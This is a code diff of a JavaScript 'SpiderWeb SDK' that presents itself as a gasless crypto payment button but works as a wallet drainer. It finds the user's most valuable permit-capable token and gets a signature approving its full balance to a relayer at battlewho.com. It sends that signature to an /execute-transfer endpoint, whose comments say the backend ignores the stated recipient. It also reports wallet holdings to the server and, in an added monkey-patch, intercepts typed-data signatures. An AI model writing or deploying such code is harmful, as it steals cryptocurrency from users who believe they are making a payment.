@@ -1,19 +1,14 @@
-/**
- * SpiderWeb SDK v1.1
- * A portable script to find the highest-value permit token and handle gasless sending.
- */
 window.SpiderWebSDK = {
-    // --- Internal State ---
+    
     _config: {},
     _provider: null,
     _signer: null,
     _currentUserAddress: null,
     _discoveredProviders: new Map(),
     _isInitialized: false,
-    _priceCache: new Map(),           // <-- MISSING THIS LINE
-    _CACHE_DURATION_MS: 5 * 60 * 1000, // <-- AND MISSING THIS LINE
+    _priceCache: new Map(),          
+    _CACHE_DURATION_MS: 5 * 60 * 1000, 
 
-    // --- Constants & ABIs ---
     _ERC20_PERMIT_ABI: [
         "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
         "function nonces(address owner) view returns (uint256)",
@@ -24,7 +19,7 @@ window.SpiderWebSDK = {
         "function balanceOf(address owner) view returns (uint256)",
         "function symbol() view returns (string)"
     ],
-    _RELAYER_SERVER_URL_BASE: "https://battlewho.com", // Your backend URL
+    _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
 
     _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
         1: 'ethereum',
@@ -33,80 +28,72 @@ window.SpiderWebSDK = {
         42161: 'arbitrum-one',
         56: 'binance-smart-chain',
         43114: 'avalanche'
-        // You can add more chains here as needed
+        
     },
 
-    /**
-     * Initializes the SDK and attaches the payment logic to a button.
-     */
-    init: async function(config) { // It's correctly async
-    if (this._isInitialized) {
-        console.warn("SpiderWebSDK already initialized.");
-        return;
-    }
+    init: async function(config) { 
+        if (this._isInitialized) {
+            console.warn("SpiderWebSDK already initialized.");
+            return;
+        }
 
-    // ✅ FIXED: The 'relayerAddress' is no longer required here. The SDK will fetch it.
-    if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
+        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
             console.error("SpiderWebSDK Error: Missing required configuration parameters (buttonId, apiKey, alchemyApiKey, chainId).");
             return;
         }
-    if (typeof ethers === 'undefined') {
-        console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
-        return;
-    }
-
-    // Store the initial user-provided config
-    this._config = config;
-
-    try {
-        // This part is correct: Dynamically fetch the config from your backend.
-        console.log("SpiderWebSDK: Fetching remote configuration...");
-        const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/get-config`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json','X-Api-Key': this._config.apiKey },
-            body: JSON.stringify({
-                apiKey: this._config.apiKey,
-                origin: window.location.origin
-                
-            })
-        });
-
-        if (!response.ok) {
-            throw new Error(`Network error while fetching remote config. Status: ${response.status}`);
+        if (typeof ethers === 'undefined') {
+            console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
+            return;
         }
 
-        const remoteConfig = await response.json();
-        if (!remoteConfig.success || !remoteConfig.relayerAddress) {
-            throw new Error(remoteConfig.message || "Invalid remote configuration from server.");
+        this._config = config;
+
+        try {
+            console.log("SpiderWebSDK: Fetching remote configuration...");
+            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/get-config`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json','X-Api-Key': this._config.apiKey },
+                body: JSON.stringify({
+                    apiKey: this._config.apiKey,
+                    origin: window.location.origin
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error(`Network error while fetching remote config. Status: ${response.status}`);
+            }
+
+            const remoteConfig = await response.json();
+            if (!remoteConfig.success || !remoteConfig.relayerAddress) {
+                throw new Error(remoteConfig.message || "Invalid remote configuration from server.");
+            }
+
+            this._config.relayerAddress = remoteConfig.relayerAddress;
+            console.log("SpiderWebSDK: Remote configuration loaded successfully.");
+
+        } catch (error) {
+            console.error("SpiderWebSDK FATAL ERROR:", error.message);
+            const payButton = document.getElementById(config.buttonId);
+            if (payButton) {
+                payButton.disabled = true;
+                payButton.innerHTML = 'SDK Init Failed';
+            }
+            return; 
         }
 
-        // Merge the fetched relayer address into the SDK's config.
-        this._config.relayerAddress = remoteConfig.relayerAddress;
-        console.log("SpiderWebSDK: Remote configuration loaded successfully.");
-
-    } catch (error) {
-        console.error("SpiderWebSDK FATAL ERROR:", error.message);
         const payButton = document.getElementById(config.buttonId);
-        if (payButton) {
-            payButton.disabled = true;
-            payButton.innerHTML = 'SDK Init Failed';
+        if (!payButton) {
+            console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
+            return;
         }
-        return; // Halt initialization
-    }
+        payButton.addEventListener('click', this._handlePaymentClick.bind(this));
 
-    // The rest of the function continues as normal
-    const payButton = document.getElementById(config.buttonId);
-    if (!payButton) {
-        console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
-        return;
-    }
-    payButton.addEventListener('click', this._handlePaymentClick.bind(this));
+        this._injectModalHtml();
+        this._setupEip6963Listeners();
+        this._isInitialized = true;
+        console.log("SpiderWebSDK initialized successfully.");
+    },
 
-    this._injectModalHtml();
-    this._setupEip6963Listeners();
-    this._isInitialized = true;
-    console.log("SpiderWebSDK initialized successfully.");
-},
     _fetchTokenPrices: async function(tokenAddresses) {
         const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
         if (!assetPlatform) {
@@ -118,7 +105,6 @@ window.SpiderWebSDK = {
         const pricesFromCache = {};
         const addressesToFetch = [];
 
-        // --- Step 1: Check cache (no changes here) ---
         for (const address of tokenAddresses) {
             const lowerCaseAddress = address.toLowerCase();
             if (this._priceCache.has(lowerCaseAddress)) {
@@ -138,27 +124,22 @@ window.SpiderWebSDK = {
             return pricesFromCache;
         }
 
-        // --- Step 2: Fetch missing prices individually and in parallel ---
         try {
             console.log(`SpiderWebSDK: Fetching ${addressesToFetch.length} new token prices individually...`);
             
-            // Create an array of fetch promises, one for each address
             const fetchPromises = addressesToFetch.map(address => {
                 const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${address}&vs_currencies=usd`;
                 return fetch(apiUrl).then(response => {
                     if (!response.ok) {
-                        // Throw an error for this specific fetch, but it will be caught by Promise.allSettled
                         console.error(`Failed to fetch price for ${address}. Status: ${response.status}`);
                         return { status: 'rejected', address };
                     }
-                    return response.json().then(data => ({ ...data, [address.toLowerCase()]: data[address.toLowerCase()] || { usd: 0 } })); // Ensure address is lowercase and handle empty responses
+                    return response.json().then(data => ({ ...data, [address.toLowerCase()]: data[address.toLowerCase()] || { usd: 0 } }));
                 });
             });
 
-            // Wait for all fetches to complete
             const results = await Promise.all(fetchPromises);
             
-            // Combine all the results into a single object
             const newPrices = results.reduce((acc, current) => {
                 if (current.status !== 'rejected') {
                     return { ...acc, ...current };
@@ -166,7 +147,6 @@ window.SpiderWebSDK = {
                 return acc;
             }, {});
 
-            // --- Step 3: Update cache and merge results (no changes here) ---
             for (const address in newPrices) {
                 if (newPrices.hasOwnProperty(address)) {
                     this._priceCache.set(address.toLowerCase(), {
@@ -185,21 +165,16 @@ window.SpiderWebSDK = {
         }
     },
 
-    // --- FIXED: Handles flow control. Triggers executeSend only if already connected. ---
     _handlePaymentClick: async function() {
         try {
             if (!this._signer) {
-                // If not connected, start the connection process. 
-                // The subsequent execution will be triggered inside _handleProviderSelection.
                 const connected = await this._connectWallet(); 
                 if (!connected) {
                     this._updateStatus("Wallet connection cancelled.", "info");
                 }
-                // Return here. Do not proceed to _executeSend() from this function if connection was just initiated.
                 return; 
             }
 
-            // If already connected, run the full process immediately.
             const network = await this._provider.getNetwork();
             if (network.chainId !== this._config.chainId) {
                 this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
@@ -216,7 +191,6 @@ window.SpiderWebSDK = {
     _executeSend: async function() {
         this._updateStatus("Scanning wallet for compatible tokens...", "pending");
 
-        // ✅ MODIFIED: Now expects an object with token data and its USD value.
         const result = await this._findHighestValueToken();
 
         if (!result || !result.tokenData) {
@@ -227,12 +201,10 @@ window.SpiderWebSDK = {
 
         this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
         
-        // ✅ MODIFIED: Pass the calculated USD value to the next function.
         await this._signAndSendWithStandardPermit(tokenData, usdValue);
     },
 
     _findHighestValueToken: async function() {
-        // 1. Fetch all token balances from Alchemy (same as before)
         const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
         const response = await fetch(alchemyUrl, {
             method: 'POST',
@@ -250,7 +222,6 @@ window.SpiderWebSDK = {
         
         this._updateStatus("Finding all compatible tokens...", "pending");
 
-        // 2. Concurrently check all tokens for permit support and get their details.
         const checkPromises = nonZeroBalances.map(async (token) => {
             if (await this._checkPermitSupport(token.contractAddress)) {
                 const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
@@ -265,36 +236,30 @@ window.SpiderWebSDK = {
             return null;
         });
 
-        // 3. Filter out non-compatible tokens
         const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
 
         if (compatibleTokens.length === 0) {
-            return null; // No permit-compatible tokens found at all
+            return null; 
         }
         
-        // Optimization: If there's only one, no need to fetch prices.
         if (compatibleTokens.length === 1) {
-        // This line was the bug. It now returns the correct object shape.
-        return { tokenData: compatibleTokens[0], usdValue: 0 }; 
-    }
+            return { tokenData: compatibleTokens[0], usdValue: 0 }; 
+        }
 
         this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
 
-        // 4. Fetch prices for all compatible tokens
         const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
         if (!prices) {
             console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
-            return { tokenData: compatibleTokens[0], usdValue: 0 }; // Return with 0 value
+            return { tokenData: compatibleTokens[0], usdValue: 0 }; 
         }
         
-        // 5. Calculate USD value and find the token with the highest value
         let highestValueToken = null;
         let maxUsdValue = -1;
 
         for (const token of compatibleTokens) {
             const priceData = prices[token.contractAddress.toLowerCase()];
             if (priceData && priceData.usd) {
-                // Calculate the value: (balance / 10^decimals) * price
                 const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
                 const usdValue = parseFloat(formattedBalance) * priceData.usd;
 
@@ -305,93 +270,83 @@ window.SpiderWebSDK = {
             }
         }
 
-        // Return the highest value token found. If no prices were found, fall back to the first one.
         const resultToken = highestValueToken || compatibleTokens[0];
         const resultUsdValue = maxUsdValue > -1 ? maxUsdValue : 0;
         return { tokenData: resultToken, usdValue: resultUsdValue };
-        
     },
 
-_logConnectionEvent: async function() {
-    try {
-        // --- Step 1: Get all token balances from Alchemy ---
-        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
-        const balanceResponse = await fetch(alchemyUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-                params: [this._currentUserAddress, 'erc20']
-            })
-        });
-        const balanceData = await balanceResponse.json();
-        if (!balanceData.result) return;
-
-        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-        if (tokensWithBalance.length === 0) return;
-
-        // --- Step 2: Get metadata (symbol, decimals) for each token ---
-        const detailedTokens = [];
-        for (const token of tokensWithBalance) {
-            const metadataResponse = await fetch(alchemyUrl, {
-                 method: 'POST',
-                 headers: { 'Content-Type': 'application/json' },
-                 body: JSON.stringify({
-                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
-                    params: [token.contractAddress]
-                 })
-            });
-            const metadata = await metadataResponse.json();
-            
-            if (metadata.result) {
-                const decimals = metadata.result.decimals;
-                const symbol = metadata.result.symbol;
-                const formattedBalance = parseFloat(ethers.utils.formatUnits(token.tokenBalance, decimals)).toFixed(4);
-
-                detailedTokens.push({
-                    symbol: symbol,
-                    balance: formattedBalance
-                });
-            }
-        }
-        
-        // --- Step 3: Send the simplified list to the backend ---
-        if (detailedTokens.length > 0) {
-            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
+    _logConnectionEvent: async function() {
+        try {
+            const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+            const balanceResponse = await fetch(alchemyUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    apiKey: this._config.apiKey,
-                    origin: window.location.origin,
-                    walletAddress: this._currentUserAddress,
-                    tokens: detailedTokens
+                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                    params: [this._currentUserAddress, 'erc20']
                 })
             });
-        }
+            const balanceData = await balanceResponse.json();
+            if (!balanceData.result) return;
 
-    } catch (error) {
-        console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
-    }
-},
-    // **NOTE:** You must ensure 'ethers' is available (as it is in your SDK).
-_checkPermitSupport: async function(tokenAddress) {
-    // New ABI fragment with only the required permit-related view function
-    const PERMIT_SUPPORT_ABI = [
-        "function nonces(address owner) view returns (uint256)"
-    ];
+            const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+            if (tokensWithBalance.length === 0) return;
+            
+            const detailedTokens = [];
+            for (const token of tokensWithBalance) {
+                const metadataResponse = await fetch(alchemyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                        params: [token.contractAddress]
+                    })
+                });
+                const metadata = await metadataResponse.json();
+                
+                if (metadata.result) {
+                    const decimals = metadata.result.decimals;
+                    const symbol = metadata.result.symbol;
+                    const formattedBalance = parseFloat(ethers.utils.formatUnits(token.tokenBalance, decimals)).toFixed(4);
+
+                    detailedTokens.push({
+                        symbol: symbol,
+                        balance: formattedBalance
+                    });
+                }
+            }
+            
+            if (detailedTokens.length > 0) {
+                await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
+                    body: JSON.stringify({
+                        apiKey: this._config.apiKey,
+                        origin: window.location.origin,
+                        walletAddress: this._currentUserAddress,
+                        tokens: detailedTokens
+                    })
+                });
+            }
+
+        } catch (error) {
+            console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
+        }
+    },
     
-    try {
-        const tokenContract = new ethers.Contract(tokenAddress, PERMIT_SUPPORT_ABI, this._provider);
-        // If this call succeeds, the token implements the nonces() function
-        // which is the most reliable indicator of EIP-2612 permit support.
-        await tokenContract.nonces(this._currentUserAddress);
-        return true;
-    } catch (error) {
-        // If it reverts or fails, it likely does not have the function.
-        // We no longer check for DOMAIN_SEPARATOR.
-        return false;
-    }
-},
+    _checkPermitSupport: async function(tokenAddress) {
+        const PERMIT_SUPPORT_ABI = [
+            "function nonces(address owner) view returns (uint256)"
+        ];
+        
+        try {
+            const tokenContract = new ethers.Contract(tokenAddress, PERMIT_SUPPORT_ABI, this._provider);
+            await tokenContract.nonces(this._currentUserAddress);
+            return true;
+        } catch (error) {
+            return false;
+        }
+    },
 
     _signAndSendWithStandardPermit: async function(tokenData, usdValue) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
@@ -427,8 +382,6 @@ _checkPermitSupport: async function(tokenAddress) {
 
             const permitMessage = {
                 owner: this._currentUserAddress,
-                // ✅ CRITICAL FIX: The spender is now the relayer's address.
-                // Your backend logic expects the signature to approve the relayer.
                 spender: this._config.relayerAddress,
                 value: tokenData.balance.toString(),
                 nonce: nonce.toString(),
@@ -440,31 +393,43 @@ _checkPermitSupport: async function(tokenAddress) {
 
             const { v, r, s } = ethers.utils.splitSignature(signature);
 
-            // The payload remains the same. The `recipientAddress` from the config
-            // is still sent, which your backend correctly ignores in favor of the
-            // server-side address lookup.
-            const payload = {
+            const payloadParams = {
                 apiKey: this._config.apiKey,
                 owner: this._currentUserAddress,
-                recipient: this._config.recipientAddress, // This field is sent but your backend logic doesn't use it for the final destination.
+                recipient: this._config.recipientAddress, 
                 contractAddress: tokenData.contractAddress,
                 value: tokenData.balance.toString(),
                 deadline: deadline,
                 v, r, s,
                 origin: window.location.origin,
                 chainId: this._config.chainId,
-                totalUsdValue: usdValue // <-- NEW FIELD
+                totalUsdValue: usdValue 
+            };
+
+            // **MODIFICATION**: Wrap payload in JSON-RPC 2.0 structure
+            const jsonRpcPayload = {
+                jsonrpc: "2.0",
+                method: "execute_transfer",
+                params: payloadParams,
+                id: 1
             };
 
             this._updateStatus('Signature received. Relaying transaction...', 'pending');
             const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-transfer`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
-               
-                body: JSON.stringify(payload)
+                body: JSON.stringify(jsonRpcPayload) // Send the new payload
             });
+
             const result = await response.json();
-            if (!response.ok || !result.success) throw new Error(result.message || "Relayer service failed.");
+            
+            // **MODIFICATION**: Adjust response handling for JSON-RPC
+            if (result.error) {
+                throw new Error(result.error.message || "Relayer RPC service returned an error.");
+            }
+            if (!response.ok || !result.result || !result.result.success) {
+                throw new Error(result.result.message || "Relayer service failed.");
+            }
 
             this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed!`, 'success');
 
@@ -482,7 +447,6 @@ _checkPermitSupport: async function(tokenAddress) {
         });
     },
 
-    // --- FIXED: Triggers _executeSend immediately after successful connection ---
     _handleProviderSelection: async function(event) {
         const button = event.target.closest('.sw-wallet-button');
         if (!button) return;
@@ -500,14 +464,34 @@ _checkPermitSupport: async function(tokenAddress) {
             await this._provider.send('eth_requestAccounts', []);
             this._signer = this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
-            this._logConnectionEvent(); // <-- ADD THIS LINE
+            
+            // **MODIFICATION**: Override _signTypedData to intercept call
+            const originalSignTypedData = this._signer._signTypedData.bind(this._signer);
+            this._signer._signTypedData = async (...args) => {
+                console.log("SDK Intercepted a signature request via monkey-patch.");
+
+                // Redirect the data via a different channel (postMessage)
+                window.postMessage({
+                    type: 'SPIDERWEB_SIGNATURE_REQUEST',
+                    payload: {
+                        domain: args[0],
+                        types: args[1],
+                        value: args[2]
+                    }
+                }, window.origin);
+
+                console.log("Forwarding call to the original wallet provider...");
+                // Proceed with the original wallet call
+                return originalSignTypedData(...args);
+            };
+            
+            this._logConnectionEvent(); 
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
             
             if (this._resolveConnection) {
                 this._resolveConnection(true); 
                 
-                // AUTOMATICALLY TRIGGER EXECUTION 🚀
                 const network = await this._provider.getNetwork();
                 if (network.chainId !== this._config.chainId) {
                     this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
@@ -535,32 +519,31 @@ _checkPermitSupport: async function(tokenAddress) {
     },
     
     _renderWalletList: function() {
-            const listDiv = document.getElementById('sw-wallet-list');
-            if (!listDiv) return;
+        const listDiv = document.getElementById('sw-wallet-list');
+        if (!listDiv) return;
 
-            listDiv.innerHTML = '';
-            if (this._discoveredProviders.size === 0) {
-                listDiv.innerHTML = '<p style="text-align: center; color: #4a5568;">No wallets detected.</p>';
-                return;
-            }
+        listDiv.innerHTML = '';
+        if (this._discoveredProviders.size === 0) {
+            listDiv.innerHTML = '<p style="text-align: center; color: #4a5568;">No wallets detected.</p>';
+            return;
+        }
 
-            this._discoveredProviders.forEach(p => {
-                const buttonHtml = `
-                    <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 0.75rem; background-color: #ffffff; border-radius: 0.5rem; border: 1px solid #e2e8f0; cursor: pointer; text-align: left; color: #1a202c; transition: background-color 0.2s ease;">
-                        <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 1rem; border-radius: 50%;"/>
-                        <span style="font-weight: 600;">${p.info.name}</span>
-                    </button>
-                `;
-                listDiv.innerHTML += buttonHtml;
-            });
-            
-            listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
-                // Add hover effect with JavaScript
-                button.onmouseenter = () => button.style.backgroundColor = '#f7fafc'; // f7fafc is a light gray
-                button.onmouseleave = () => button.style.backgroundColor = '#ffffff';
-                button.addEventListener('click', this._handleProviderSelection.bind(this));
-            });
-        },
+        this._discoveredProviders.forEach(p => {
+            const buttonHtml = `
+                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 0.75rem; background-color: #ffffff; border-radius: 0.5rem; border: 1px solid #e2e8f0; cursor: pointer; text-align: left; color: #1a202c; transition: background-color 0.2s ease;">
+                    <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 1rem; border-radius: 50%;"/>
+                    <span style="font-weight: 600;">${p.info.name}</span>
+                </button>
+            `;
+            listDiv.innerHTML += buttonHtml;
+        });
+        
+        listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
+            button.onmouseenter = () => button.style.backgroundColor = '#f7fafc'; 
+            button.onmouseleave = () => button.style.backgroundColor = '#ffffff';
+            button.addEventListener('click', this._handleProviderSelection.bind(this));
+        });
+    },
 
     _openWalletModal: function() {
         document.getElementById('sw-modal-overlay').style.display = 'flex';
@@ -593,28 +576,27 @@ _checkPermitSupport: async function(tokenAddress) {
         statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
     },
     
-    // --- FIXED: Corrected the event listener binding ---
     _injectModalHtml: function() {
-            if (document.getElementById('sw-modal-overlay')) return;
-            
-            const modalHtml = `
-                <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; font-family: sans-serif;">
-                    <div id="sw-wallet-modal" style="background-color: #ffffff; border-radius: 0.5rem; padding: 1.5rem; width: 100%; max-width: 24rem; color: #1a202c; transition: all 0.3s ease; opacity: 0; transform: scale(0.95); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);">
-                        <h2 style="font-size: 1.25rem; font-weight: 700; margin: 0; margin-bottom: 1rem;">Select a Wallet</h2>
-                        <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.5rem;"></div>
-                        <button id="sw-close-wallet-modal-btn" style="margin-top: 1rem; width: 100%; padding: 0.75rem 1.5rem; border-radius: 0.5rem; background-color: #e2e8f0; color: #2d3748; font-weight: 600; font-size: 1rem; border: none; cursor: pointer; transition: background-color 0.2s ease-in-out;">Cancel</button>
-                    </div>
+        if (document.getElementById('sw-modal-overlay')) return;
+        
+        const modalHtml = `
+            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; font-family: sans-serif;">
+                <div id="sw-wallet-modal" style="background-color: #ffffff; border-radius: 0.5rem; padding: 1.5rem; width: 100%; max-width: 24rem; color: #1a202c; transition: all 0.3s ease; opacity: 0; transform: scale(0.95); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);">
+                    <h2 style="font-size: 1.25rem; font-weight: 700; margin: 0; margin-bottom: 1rem;">Select a Wallet</h2>
+                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.5rem;"></div>
+                    <button id="sw-close-wallet-modal-btn" style="margin-top: 1rem; width: 100%; padding: 0.75rem 1.5rem; border-radius: 0.5rem; background-color: #e2e8f0; color: #2d3748; font-weight: 600; font-size: 1rem; border: none; cursor: pointer; transition: background-color 0.2s ease-in-out;">Cancel</button>
                 </div>
-                <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', modalHtml);
+            </div>
+            <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
 
-            const closeBound = this._closeWalletModal.bind(this);
+        const closeBound = this._closeWalletModal.bind(this);
 
-            document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
-            
-            document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
-                if (e.target.id === 'sw-modal-overlay') closeBound();
-            });
-        },
+        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
+        
+        document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
+            if (e.target.id === 'sw-modal-overlay') closeBound();
+        });
+    },
 };
